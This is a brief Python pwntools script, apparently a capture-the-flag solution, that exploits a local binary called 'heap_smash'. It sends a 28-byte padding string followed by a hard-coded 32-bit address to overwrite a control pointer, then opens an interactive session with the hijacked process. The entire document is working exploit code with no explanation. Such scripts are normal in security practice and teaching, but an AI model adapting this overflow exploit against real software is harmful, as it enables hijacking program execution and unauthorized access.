from pwn import *

p = process("./heap_smash")

p.sendline("A"*28+"\x4d\x87\x04\x08")
p.sendline("")
ret = p.recv(200)
print(ret)
p.interactive()
